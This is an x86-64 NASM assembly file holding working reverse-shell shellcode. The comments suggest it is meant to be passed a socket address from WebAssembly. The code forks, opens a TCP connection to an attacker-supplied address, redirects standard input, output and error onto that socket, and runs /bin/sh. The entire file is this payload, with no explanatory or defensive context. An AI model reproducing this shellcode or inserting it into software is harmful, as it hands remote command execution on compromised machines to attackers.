BITS 64

; wasm arg1 = sockaddr (AF_INET | PORT | IP) -> rax

push rbx
mov rbx, rax

xor rax, rax
mov al, 57
syscall                                 ; fork()
test rax, rax
jz child
pop rbx
ret

child:
    mov rdi, 0x2                        ; domain = AF_INET
    mov rsi, 0x1                        ; type = SOCK_STREAM
    xor rdx, rdx                        ; protocol
    mov al, 41
    syscall                             ; socket(AF_INET, SOCK_STREAM, 0x0)
    xchg rdi, rax                       ; sockfd
    push rbx
    mov rsi, rsp                        ; *sockaddr
    mov rdx, 0x10                       ; addrlen
    mov al, 42
    syscall                             ; connect(sockfd, *sockaddr, sizeof(sockaddr))
    mov rsi, 0x3

dup:
    dec rsi                             ; newfd
    mov al, 33
    syscall                             ; dup2(sockfd, newfd)

exec:
    jne dup
    xor rdx, rdx
    mov rbx, 0x68732f6e69622f           ; "/bin/sh"
    push rbx
    mov rdi, rsp                        ; *filename
    push rdx                            ; argv[1] = 0
    push rdi                            ; argv[0] = "/bin/sh"
    mov rsi, rsp                        ; *argv
    mov al, 59
    syscall                             ; execve("/bin/sh", ["/bin/sh"])
